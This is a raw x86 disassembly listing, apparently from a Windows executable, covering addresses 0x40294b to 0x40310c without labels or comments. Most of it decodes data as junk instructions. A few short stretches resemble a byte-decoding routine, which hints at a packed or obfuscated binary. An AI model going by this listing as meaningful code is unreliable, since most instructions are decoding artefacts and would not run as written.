  40294b:	mov    ds:0x495b81df,eax
  402950:	push   edx
  402951:	fwait
  402952:	pop    eax
  402953:	aas    
  402954:	lods   al,BYTE PTR ds:[esi]
  402955:	retf   0xb791
  402958:	mov    ch,0x2b
  40295a:	adc    ecx,DWORD PTR ds:0xd51e9cc0
  402960:	jecxz  0x4029d0
  402962:	mov    bh,0x7f
  402964:	mov    al,ds:0xeb3075eb
  402969:	adc    BYTE PTR [ebp-0x3],dl
  40296c:	(bad)  
  40296d:	push   edx
  40296e:	push   ebx
  40296f:	repz push 0xfffffffb
  402972:	outs   dx,DWORD PTR ds:[esi]
  402973:	pop    es
  402974:	shl    BYTE PTR [edx+edi*8-0x1bf70d42],0x6d
  40297c:	test   DWORD PTR [eax],esi
  40297e:	jno    0x4029d9
  402980:	leave  
  402981:	aam    0xd3
  402983:	mov    bh,0x65
  402985:	scas   al,BYTE PTR es:[edi]
  402986:	cmp    bl,BYTE PTR ds:0x1528e504
  40298c:	pop    ebx
  40298d:	les    esp,FWORD PTR [esi]
  40298f:	mov    esi,0xdc6452a8
  402994:	dec    edi
  402995:	retf   0x4af4
  402998:	mov    DWORD PTR [eax-0x186e4fe],esp
  40299e:	sbb    al,0xe2
  4029a0:	mov    eax,ds:0x7b0d7006
  4029a5:	mov    ds:0xd5522c46,eax
  4029aa:	or     al,0x84
  4029ac:	inc    eax
  4029ad:	call   0xe89c:0x41a09613
  4029b4:	fistp  WORD PTR [eax+0x11a97d8c]
  4029ba:	mov    dh,0x2a
  4029bc:	enter  0x3436,0xb6
  4029c0:	mov    ebp,eax
  4029c2:	dec    ebp
  4029c3:	rol    BYTE PTR [edi-0x56],0xec
  4029c7:	stos   BYTE PTR es:[edi],al
  4029c8:	inc    ebp
  4029c9:	mov    ah,0x5b
  4029cb:	jg     0x4029c9
  4029cd:	lods   al,BYTE PTR ds:[esi]
  4029ce:	xor    esi,DWORD PTR [esi+0x12173d5d]
  4029d4:	sub    dl,dh
  4029d6:	cld    
  4029d7:	leave  
  4029d8:	out    dx,al
  4029d9:	data16 loopne 0x40299c
  4029dc:	clc    
  4029dd:	aad    0x24
  4029df:	or     eax,0x3398e436
  4029e4:	add    eax,0x5f9e17ef
  4029e9:	(bad)  
  4029ea:	fwait
  4029eb:	pop    ebp
  4029ec:	in     eax,0x8b
  4029ee:	sub    DWORD PTR ds:0x6987272,esp
  4029f4:	xchg   ebx,eax
  4029f5:	and    eax,0x5afeb8df
  4029fa:	pop    esp
  4029fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029fc:	fwait
  4029fd:	ins    BYTE PTR es:[edi],dx
  4029fe:	jmp    0x402a11
  402a00:	or     cl,BYTE PTR ds:0x9115d4af
  402a06:	push   ebx
  402a07:	mov    esi,0x80c89c51
  402a0c:	nop
  402a0d:	dec    ecx
  402a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a0f:	int3   
  402a10:	loope  0x4029b8
  402a12:	jo     0x40299f
  402a14:	inc    ebp
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	dec    ebx
  402a35:	(bad)  
  402a36:	push   ecx
  402a37:	shr    DWORD PTR [edx-0x58181f3],1
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402a40
  402a41:	or     eax,0xe7a4be24
  402a46:	loopne 0x4029e5
  402a48:	and    BYTE PTR [eax],ah
  402a4a:	xor    eax,0x53ad56e0
  402a4f:	mov    DWORD PTR [edi],ebx
  402a51:	ret    0xa1ab
  402a54:	adc    ecx,ecx
  402a56:	enter  0xa308,0x61
  402a5a:	xor    eax,0x8645caff
  402a5f:	mov    dl,0xa3
  402a61:	cwde   
  402a62:	xor    BYTE PTR [esi-0xc],ah
  402a65:	sub    al,0x42
  402a67:	ins    DWORD PTR es:[edi],dx
  402a68:	mov    ebp,0xec576d6
  402a6d:	adc    DWORD PTR [edx+0x4b],eax
  402a70:	ds push esi
  402a72:	rcl    BYTE PTR [edi],1
  402a74:	dec    ebx
  402a75:	adc    DWORD PTR [eax-0x18011fa9],ebp
  402a7b:	cwde   
  402a7c:	ror    BYTE PTR [ebp-0x7c31e607],1
  402a82:	push   cs
  402a83:	pop    edi
  402a84:	xor    bh,BYTE PTR [ebx]
  402a86:	fbld   TBYTE PTR [esi+0x72]
  402a89:	retf   0xed08
  402a8c:	mov    ah,dh
  402a8e:	and    eax,0x374c7d75
  402a93:	xor    dl,0x50
  402a96:	xor    al,0xa3
  402a98:	and    ebx,DWORD PTR [esi-0x3d]
  402a9b:	pop    eax
  402a9c:	sub    DWORD PTR [ebp+0x4],edx
  402a9f:	mov    eax,ds:0xaed66e3
  402aa4:	jne    0x402af2
  402aa6:	ins    DWORD PTR es:[edi],dx
  402aa7:	inc    esp
  402aa8:	or     eax,0xbd7ada92
  402aad:	int3   
  402aae:	ss xchg edx,eax
  402ab0:	xor    eax,0x28623a48
  402ab5:	idiv   ebp
  402ab7:	call   0xa597:0x785624da
  402abe:	iret   
  402abf:	jp     0x402b40
  402ac1:	dec    ebx
  402ac2:	fisubr WORD PTR [ecx-0x5bae5111]
  402ac8:	bound  ecx,QWORD PTR [esi]
  402aca:	(bad)  
  402acb:	aaa    
  402acc:	or     ah,BYTE PTR [ecx-0x3e7d6574]
  402ad2:	rcl    esp,0xe1
  402ad5:	stos   DWORD PTR es:[edi],eax
  402ad6:	outs   dx,DWORD PTR ds:[esi]
  402ad7:	adc    BYTE PTR [eax],ch
  402ad9:	mov    esp,ecx
  402adb:	xchg   edx,eax
  402adc:	daa    
  402add:	jecxz  0x402b57
  402adf:	mov    esi,0xf37c9587
  402ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ae5:	out    0x6c,eax
  402ae7:	sahf   
  402ae8:	jnp    0x402a8c
  402aea:	aaa    
  402aeb:	test   BYTE PTR ds:0x79a3cb08,0x94
  402af2:	jbe    0x402b21
  402af4:	cdq    
  402af5:	jbe    0x402b0b
  402af7:	ss cmp ecx,0xffffff85
  402afb:	fisubr WORD PTR ds:0x97c29e01
  402b01:	dec    edi
  402b02:	mov    ebp,0x3c0a33c3
  402b07:	mov    ecx,0x623cb55
  402b0c:	adc    cl,BYTE PTR [eax]
  402b0e:	cmp    DWORD PTR [ebx+0x4a],edx
  402b11:	ins    BYTE PTR es:[edi],dx
  402b12:	push   ebx
  402b13:	sub    ecx,eax
  402b15:	pop    ebp
  402b16:	mov    esi,0xbe541491
  402b1b:	and    edi,DWORD PTR [esi]
  402b1d:	retf   
  402b1e:	xchg   ebx,eax
  402b1f:	int3   
  402b20:	cmp    al,0xa4
  402b22:	push   edx
  402b23:	cmp    al,0xa9
  402b25:	sub    DWORD PTR [eax+ebp*4],esi
  402b28:	sbb    ch,BYTE PTR [edi+eax*8]
  402b2b:	popa   
  402b2c:	ret    0x32c8
  402b2f:	shl    BYTE PTR [eax],0x59
  402b32:	xor    cl,BYTE PTR [eax-0x36eb44b5]
  402b38:	aam    0x55
  402b3a:	cmp    al,0x99
  402b3c:	sub    BYTE PTR [edi-0x5b],al
  402b3f:	inc    ebx
  402b40:	std    
  402b41:	inc    ebx
  402b42:	xchg   ecx,eax
  402b43:	imul   eax,DWORD PTR [ecx],0x72
  402b46:	mov    esp,DWORD PTR [edi-0x29]
  402b49:	mov    edi,0x212652d7
  402b4e:	(bad)  
  402b50:	dec    edi
  402b51:	sub    al,0x53
  402b53:	add    DWORD PTR [esi+0x417090d2],ebp
  402b59:	adc    ecx,0x73
  402b5c:	pop    es
  402b5d:	int3   
  402b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b5f:	rcr    DWORD PTR [ecx],1
  402b61:	mov    edx,DWORD PTR [edi-0x1717892c]
  402b67:	retf   0x69cd
  402b6a:	cdq    
  402b6b:	cdq    
  402b6c:	pop    ss
  402b6d:	fs test edx,eax
  402b70:	or     esi,DWORD PTR [esi-0x386d7ba7]
  402b76:	and    BYTE PTR [eax+edi*8-0x2c],ch
  402b7a:	mov    bl,0x6d
  402b7c:	jl     0x402b00
  402b7e:	dec    edx
  402b7f:	cmp    DWORD PTR [edi+0x8],0x63a39704
  402b86:	inc    ebx
  402b87:	lahf   
  402b88:	(bad)  
  402b89:	aad    0x76
  402b8b:	(bad)  
  402b8c:	in     eax,0xf8
  402b8e:	xchg   esp,eax
  402b8f:	in     al,dx
  402b90:	cld    
  402b91:	fadd   QWORD PTR [ecx+ebx*1]
  402b94:	sub    DWORD PTR [esi],edx
  402b96:	mov    ds:0x520a69cd,al
  402b9b:	ja     0x402b72
  402b9d:	jns    0x402b94
  402b9f:	pusha  
  402ba0:	lahf   
  402ba1:	ret    
  402ba2:	dec    ecx
  402ba3:	sub    ebp,ebp
  402ba5:	adc    DWORD PTR [eax-0x48],0xfffffff0
  402ba9:	mov    DWORD PTR [edx+0x31],esi
  402bac:	and    eax,0x80cb2c98
  402bb1:	jmp    0xc099:0xdaeafc9
  402bb8:	xor    esi,esi
  402bba:	and    al,0xa9
  402bbc:	sub    eax,0xa0e2f263
  402bc1:	in     al,0xa6
  402bc3:	xor    DWORD PTR [ebp+0x28840fc0],eax
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	pop    ss
  402c12:	inc    esi
  402c13:	mov    bl,0x25
  402c15:	or     edi,DWORD PTR ss:[esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c1f
  402c1e:	pop    sp
  402c20:	popf   
  402c21:	cmp    al,BYTE PTR [edx-0x7adbc7bf]
  402c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c28:	inc    edi
  402c29:	in     al,0x75
  402c2b:	pop    ecx
  402c2c:	and    dh,bl
  402c2e:	in     al,0x2a
  402c30:	push   eax
  402c31:	int3   
  402c32:	jns    0x402c20
  402c34:	cmp    al,0xe0
  402c36:	leave  
  402c37:	call   DWORD PTR ds:0xa354dcb6
  402c3d:	and    DWORD PTR [edx-0x9],edx
  402c40:	or     al,al
  402c42:	sub    BYTE PTR [ecx-0x1097785f],bl
  402c48:	outs   dx,BYTE PTR ds:[esi]
  402c49:	jb     0x402c71
  402c4b:	jns    0x402cae
  402c4d:	dec    edx
  402c4e:	xor    al,0x56
  402c50:	and    BYTE PTR [esi-0x1af39de8],bh
  402c56:	ja     0x402be4
  402c58:	(bad)  [ebx]
  402c5a:	xchg   BYTE PTR [edx-0x65],ch
  402c5d:	in     al,dx
  402c5e:	repnz sbb DWORD PTR [ebp+0x1],eax
  402c62:	add    ebx,DWORD PTR [ebx]
  402c64:	cld    
  402c65:	fsubr  st(5),st
  402c67:	scas   al,BYTE PTR es:[edi]
  402c68:	test   DWORD PTR [ecx+0x5f72f908],ecx
  402c6e:	dec    ebp
  402c6f:	dec    ecx
  402c70:	pusha  
  402c71:	or     ebp,DWORD PTR [ebp+0x40]
  402c74:	mov    DWORD PTR [ecx-0x348df2c9],0xff890dee
  402c7e:	add    BYTE PTR [esi-0x7d715639],ch
  402c84:	pop    edx
  402c85:	pushf  
  402c86:	mov    esi,0x320370d1
  402c8b:	lea    ecx,[esi-0x59341b1d]
  402c91:	pop    DWORD PTR [ecx-0x4a96ad58]
  402c97:	stos   DWORD PTR es:[edi],eax
  402c98:	adc    eax,0xb15352a6
  402c9d:	enter  0x96e,0xe1
  402ca1:	mov    edi,0x77ca2905
  402ca6:	data16 loop 0x402ca9
  402ca9:	mov    esi,0x3f0053ff
  402cae:	ret    
  402caf:	js     0x402c4c
  402cb1:	cmp    al,0x9f
  402cb3:	cs push bp
  402cb6:	xor    DWORD PTR [ecx],0x926f64da
  402cbc:	mov    edx,0x86e59389
  402cc1:	xor    eax,0x68f68b4c
  402cc6:	cs inc ebx
  402cc8:	pop    ss
  402cc9:	stc    
  402cca:	adc    bl,BYTE PTR [ebx]
  402ccc:	mov    esi,0xc4d3a9e5
  402cd1:	push   0x601a70c9
  402cd6:	inc    ebp
  402cd7:	pop    eax
  402cd8:	dec    esp
  402cd9:	iret   
  402cda:	or     eax,0xde97ad72
  402cdf:	mov    es,esp
  402ce1:	xor    al,0xa
  402ce3:	popa   
  402ce4:	pop    ebp
  402ce5:	and    edx,eax
  402ce7:	stos   DWORD PTR es:[edi],eax
  402ce8:	inc    edx
  402ce9:	mov    ds:0x47e5a894,al
  402cee:	inc    ebp
  402cef:	mov    ds:0x6a48d003,eax
  402cf4:	mov    ah,0xb4
  402cf6:	inc    esi
  402cf7:	push   ecx
  402cf8:	cmp    bh,BYTE PTR [edi+0x57]
  402cfb:	ins    DWORD PTR es:[edi],dx
  402cfc:	push   edx
  402cfd:	idiv   DWORD PTR [ebx+ebp*4]
  402d00:	ror    DWORD PTR [edi-0x2e7f4ca4],cl
  402d06:	retf   0xa923
  402d09:	xchg   ebx,eax
  402d0a:	push   cs
  402d0b:	dec    esp
  402d0c:	inc    esi
  402d0d:	in     eax,dx
  402d0e:	cdq    
  402d0f:	push   ecx
  402d10:	cmp    BYTE PTR [edi],cl
  402d12:	dec    esp
  402d13:	or     eax,0x363eeb7f
  402d18:	imul   ebx,esi,0xffffffa2
  402d1b:	jmp    0x402cf3
  402d1d:	(bad)  
  402d1e:	jle    0x402d7c
  402d20:	push   ebp
  402d21:	out    dx,eax
  402d22:	xchg   BYTE PTR [edi],dh
  402d24:	sbb    eax,0xc6b4eaa2
  402d29:	inc    ebp
  402d2a:	ds ins DWORD PTR es:[edi],dx
  402d2c:	mov    esp,esi
  402d2e:	es repnz inc ebp
  402d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d32:	retf   0xdd9
  402d35:	jecxz  0x402d67
  402d37:	cdq    
  402d38:	or     ecx,ebp
  402d3a:	and    cl,dh
  402d3c:	retf   0x397f
  402d3f:	push   es
  402d40:	aas    
  402d41:	add    DWORD PTR ds:0x57834035,esi
  402d47:	xchg   esi,eax
  402d48:	mov    ebx,0xd9c6fe32
  402d4d:	push   es
  402d4e:	add    ebp,edx
  402d50:	xor    bh,bl
  402d52:	adc    DWORD PTR [edx+0x2cafedcf],edi
  402d58:	and    BYTE PTR [ecx-0x626685ae],cl
  402d5e:	push   ss
  402d5f:	mov    ch,BYTE PTR [edx-0x48]
  402d62:	test   eax,0xa4717904
  402d67:	icebp  
  402d68:	mov    BYTE PTR [esi],dl
  402d6a:	push   es
  402d6b:	xlat   BYTE PTR ds:[ebx]
  402d6c:	ins    DWORD PTR es:[edi],dx
  402d6d:	dec    ecx
  402d6e:	fistp  QWORD PTR ds:0xd0f7589e
  402d74:	nop
  402d75:	fwait
  402d76:	sbb    eax,0x6451ce22
  402d7b:	out    0xa6,al
  402d7d:	in     eax,0xf5
  402d7f:	cmp    al,0x72
  402d81:	(bad)  [edx]
  402d83:	inc    edx
  402d84:	popf   
  402d85:	(bad)  
  402d87:	jmp    0xfe0a:0x98dcb249
  402d8e:	lods   al,BYTE PTR ds:[esi]
  402d8f:	push   eax
  402d90:	sbb    al,0xbd
  402d92:	ds jmp 0x402d62
  402d95:	xor    cl,dl
  402d97:	sub    BYTE PTR ds:0x99c6fc5e,ah
  402d9d:	outs   dx,DWORD PTR ds:[esi]
  402d9e:	add    ebp,DWORD PTR [ecx]
  402da0:	push   ss
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [edi+ebp*2+0x5e],1
  402de7:	jmp    0x402ded
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e5b
  402df2:	les    edi,FWORD PTR [esp+edi*4]
  402df5:	adc    BYTE PTR [eax],bl
  402df7:	dec    ebx
  402df8:	add    cl,bl
  402dfa:	push   edi
  402dfb:	xlat   BYTE PTR ds:[ebx]
  402dfc:	fiadd  DWORD PTR [esi+0x3a35637f]
  402e02:	scas   al,BYTE PTR es:[edi]
  402e03:	fisubr DWORD PTR [edi+edx*1-0xd49d121]
  402e0a:	sub    al,0x87
  402e0c:	push   edx
  402e0d:	leave  
  402e0e:	leave  
  402e0f:	into   
  402e10:	or     eax,0x1ab35976
  402e15:	add    eax,0xc47a600b
  402e1a:	out    dx,al
  402e1b:	stc    
  402e1c:	out    0xf7,eax
  402e1e:	js     0x402db2
  402e20:	inc    esp
  402e21:	leave  
  402e22:	push   ss
  402e23:	test   al,0x32
  402e25:	mov    esi,0x9253b5e6
  402e2a:	hlt    
  402e2b:	fcomp  DWORD PTR [ebp-0x7d722f8c]
  402e31:	dec    edx
  402e32:	les    ecx,FWORD PTR ds:0x2bb4fd99
  402e38:	and    ch,0xee
  402e3b:	push   ebp
  402e3c:	ret    0x13f3
  402e3f:	mov    eax,fs:0x41fb12a1
  402e45:	xchg   DWORD PTR [eax],ebx
  402e47:	retf   0x9515
  402e4a:	xor    eax,0x266d3644
  402e4f:	mov    eax,0x83d1118a
  402e54:	add    eax,0x80bb42fa
  402e59:	cmp    DWORD PTR [edi+eiz*2],edi
  402e5c:	popa   
  402e5d:	xor    eax,0xe78c554
  402e62:	mov    eax,0x9d680f5c
  402e67:	dec    edx
  402e68:	add    al,0x44
  402e6a:	inc    edx
  402e6b:	push   es
  402e6c:	add    DWORD PTR [esp+esi*2-0x79],ebx
  402e70:	test   al,0x52
  402e72:	mov    bh,0x7f
  402e74:	pop    eax
  402e75:	push   esi
  402e76:	outs   dx,BYTE PTR ds:[esi]
  402e77:	fs jns 0x402e12
  402e7a:	push   es
  402e7b:	int    0x71
  402e7d:	sbb    esi,DWORD PTR [ebx-0x5c323f19]
  402e83:	xchg   edi,eax
  402e84:	add    BYTE PTR [edx-0x7d],0x67
  402e88:	out    dx,al
  402e89:	ja     0x402ed5
  402e8b:	lock jne 0x402e45
  402e8e:	xor    eax,0x4a81fbfb
  402e93:	fs pop ebx
  402e95:	leave  
  402e96:	and    DWORD PTR [ebx],edx
  402e98:	cmp    bl,bl
  402e9a:	inc    esi
  402e9b:	(bad)  
  402e9c:	or     eax,0x801c645a
  402ea1:	data16 fsubr DWORD PTR [eax+0x15031cad]
  402ea8:	push   0x77
  402eaa:	mov    esp,0x23898e7e
  402eaf:	fs je  0x402eed
  402eb2:	push   eax
  402eb3:	loope  0x402e8f
  402eb5:	cmp    DWORD PTR [ebx],0x60
  402eb8:	xchg   BYTE PTR [eax+ebp*2-0x72261301],ah
  402ebf:	xlat   BYTE PTR ds:[ebx]
  402ec0:	loop   0x402e43
  402ec2:	aaa    
  402ec3:	xor    eax,0x40cf10f8
  402ec8:	sahf   
  402ec9:	out    0x96,eax
  402ecb:	jno    0x402e5c
  402ecd:	ds push ss
  402ecf:	xchg   edx,eax
  402ed0:	cmp    eax,0x1e08046f
  402ed5:	sar    ebx,1
  402ed7:	es xor al,dh
  402eda:	(bad)  
  402edb:	adc    al,0x16
  402edd:	mov    esi,0xe95745af
  402ee2:	jl     0x402eff
  402ee4:	sub    esi,DWORD PTR [eax-0x5389696b]
  402eea:	mov    ecx,0x65cd1d9e
  402eef:	sub    al,BYTE PTR [ebx*2-0x17a187fc]
  402ef6:	pop    edi
  402ef7:	pop    es
  402ef8:	mov    eax,0x227ee976
  402efd:	jns    0x402f2b
  402eff:	loope  0x402f6c
  402f01:	pop    edi
  402f02:	lds    esp,FWORD PTR [edx]
  402f04:	icebp  
  402f05:	add    ebx,ebx
  402f07:	push   0xff66919
  402f0c:	je     0x402e91
  402f0e:	pop    eax
  402f0f:	sbb    al,0x2b
  402f11:	push   0x146b630c
  402f16:	ins    BYTE PTR es:[edi],dx
  402f17:	or     DWORD PTR [edi+0x3f8ddf99],0xa1dfaaf4
  402f21:	shr    BYTE PTR [ebx+0x22c37dd0],0x24
  402f28:	inc    edi
  402f29:	push   es
  402f2a:	aam    0x7e
  402f2c:	cs dec edi
  402f2e:	nop
  402f2f:	cwde   
  402f30:	or     ebx,ebx
  402f32:	pop    edx
  402f33:	jle    0x402f2f
  402f35:	lea    eax,[ecx]
  402f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f38:	jns    0x402f1d
  402f3a:	or     esi,DWORD PTR [ecx+eiz*2-0x25]
  402f3e:	cmp    ah,BYTE PTR [esi+edx*4-0x46bb2441]
  402f45:	jns    0x402ed1
  402f47:	fwait
  402f48:	xor    eax,0x89c8de05
  402f4d:	adc    DWORD PTR [ebp-0x40c47587],0xffffffe0
  402f54:	int3   
  402f55:	cmp    ebp,esi
  402f57:	adc    BYTE PTR [eax],0xca
  402f5a:	and    eax,0x33e33ed4
  402f5f:	cmp    esi,esp
  402f61:	pop    es
  402f62:	mov    ebp,0x190762fb
  402f67:	call   0x2b37:0xc9dfedef
  402f6e:	les    ebx,FWORD PTR [ecx+0x7b]
  402f71:	mov    WORD PTR [eax+0x67],?
  402f74:	loop   0x402f03
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x258a5b7]
  402fae:	aas    
  402faf:	mov    ah,0x3e
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f5f
  402fb9:	icebp  
  402fba:	adc    ah,BYTE PTR [edi]
  402fbc:	push   edi
  402fbd:	call   0x84ab4c07
  402fc2:	hlt    
  402fc3:	push   cs
  402fc4:	push   ds
  402fc5:	pop    es
  402fc6:	mov    edx,0xe35d579d
  402fcb:	out    0x46,eax
  402fcd:	ins    DWORD PTR es:[edi],dx
  402fce:	sahf   
  402fcf:	cs std 
  402fd1:	push   eax
  402fd2:	inc    ebx
  402fd3:	pop    es
  402fd4:	fist   DWORD PTR [ebx]
  402fd6:	(bad)  
  402fd7:	mov    bh,0x53
  402fd9:	mov    ebx,0x36ac571f
  402fde:	jb     0x402f8b
  402fe0:	push   0x5dc9224e
  402fe5:	push   ebp
  402fe6:	push   cs
  402fe7:	adc    al,0x4d
  402fe9:	ins    DWORD PTR es:[edi],dx
  402fea:	sbb    bl,BYTE PTR [ebx-0x29]
  402fed:	push   eax
  402fee:	iret   
  402fef:	xor    ch,bh
  402ff1:	test   ah,0x39
  402ff4:	outs   dx,BYTE PTR ds:[esi]
  402ff5:	pop    esi
  402ff6:	jbe    0x402f85
  402ff8:	gs adc eax,0xbbb64102
  402ffe:	in     al,dx
  402fff:	loop   0x403005
  403001:	xchg   ebx,eax
  403002:	jp     0x402fd4
  403004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403005:	mov    eax,0xffe1b25
  40300a:	adc    cl,0x8b
  40300d:	in     al,dx
  40300e:	mov    eax,0x47697c25
  403013:	xlat   BYTE PTR ds:[ebx]
  403014:	dec    esp
  403015:	mov    ah,0xe1
  403017:	push   esi
  403018:	mov    edx,?
  40301a:	jle    0x402fbf
  40301c:	and    DWORD PTR [ebp+0x7d597776],edx
  403022:	shr    bl,cl
  403024:	mov    BYTE PTR [eax-0x1c],bh
  403027:	sub    DWORD PTR [ecx],edi
  403029:	mov    esi,DWORD PTR [ebp-0x42]
  40302c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40302d:	sub    ch,0x7d
  403030:	imul   ecx,DWORD PTR [edx-0x15744c69],0xffffffac
  403037:	fistp  DWORD PTR [eax-0x5d6757cf]
  40303d:	bound  esi,QWORD PTR [ecx-0x59]
  403040:	mov    al,ds:0x93a3031d
  403045:	lods   eax,DWORD PTR ds:[esi]
  403046:	cdq    
  403047:	int    0xca
  403049:	lock sub esp,ebp
  40304c:	cwde   
  40304d:	xchg   BYTE PTR [edi-0x73],ah
  403050:	xchg   edx,eax
  403051:	inc    edx
  403052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403053:	xchg   ebx,eax
  403054:	aas    
  403055:	imul   ecx,DWORD PTR [edi],0x49
  403058:	loop   0x402fde
  40305a:	test   BYTE PTR [esi],al
  40305c:	shl    BYTE PTR [ebp+0x6d],1
  40305f:	sbb    eax,edx
  403061:	fadd   QWORD PTR [edx+0x2e]
  403064:	cmp    BYTE PTR ss:[edx],cl
  403067:	inc    ecx
  403068:	icebp  
  403069:	add    dl,BYTE PTR [edx-0x77e5aaf1]
  40306f:	outs   dx,BYTE PTR ds:[esi]
  403070:	mov    bl,BYTE PTR [edi-0x1a]
  403073:	ins    BYTE PTR es:[edi],dx
  403074:	pusha  
  403075:	imul   ecx,DWORD PTR [ebx+0x6d],0x6cf22b7e
  40307c:	ins    DWORD PTR es:[edi],dx
  40307d:	xlat   BYTE PTR ds:[ebx]
  40307e:	mov    BYTE PTR [ebp+0x965374c],ah
  403084:	test   DWORD PTR [edx-0x349d0770],eax
  40308a:	push   ds
  40308b:	jne    0x403069
  40308d:	mov    gs,WORD PTR [edx]
  40308f:	out    dx,al
  403090:	lahf   
  403091:	xor    dl,BYTE PTR [ebx+0x51]
  403094:	hlt    
  403095:	dec    esp
  403096:	cmp    al,0x5e
  403098:	ins    DWORD PTR es:[edi],dx
  403099:	ins    DWORD PTR es:[edi],dx
  40309a:	jmp    0x3011ca31
  40309f:	loope  0x403091
  4030a1:	mov    ds:0x2aa4eae4,eax
  4030a6:	sahf   
  4030a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030a8:	add    esp,DWORD PTR [edi-0x1d163d74]
  4030ae:	ins    BYTE PTR es:[edi],dx
  4030af:	jmp    0x2596e14e
  4030b4:	ins    BYTE PTR es:[edi],dx
  4030b5:	jg     0x403047
  4030b7:	pop    ebx
  4030b8:	enter  0xecab,0x7d
  4030bc:	dec    ebx
  4030bd:	and    DWORD PTR [ebp+ebp*8+0x26],edi
  4030c1:	mov    eax,0xef6cf749
  4030c6:	dec    esp
  4030c7:	pop    ebp
  4030c8:	jne    0x403088
  4030ca:	and    al,0xe1
  4030cc:	icebp  
  4030cd:	xchg   edx,eax
  4030ce:	sahf   
  4030cf:	fstp   TBYTE PTR [ebx]
  4030d1:	inc    ebx
  4030d2:	scas   al,BYTE PTR es:[edi]
  4030d3:	dec    di
  4030d5:	lock mov edi,0xafc032b8
  4030db:	xor    eax,0x7244513c
  4030e0:	lds    ebp,FWORD PTR [ecx-0x4e9a6047]
  4030e6:	cmc    
  4030e7:	ja     0x403086
  4030e9:	pop    ecx
  4030ea:	mov    ebx,DWORD PTR [ebp-0x152bd69c]
  4030f0:	jo     0x403113
  4030f2:	adc    BYTE PTR [edx],bl
  4030f4:	mov    ah,0x60
  4030f6:	add    BYTE PTR [ebp+0x1d],0x1a
  4030fa:	out    0x92,eax
  4030fc:	in     eax,dx
  4030fd:	dec    edx
  4030fe:	iret   
  4030ff:	mov    esi,0x54c21eb
  403104:	jnp    0x403185
  403106:	xor    ah,0x3c
  403109:	sub    BYTE PTR [ebp+0x4c],bh
  40310c:	test   DWORD PTR ds:0x83d1a722,edx
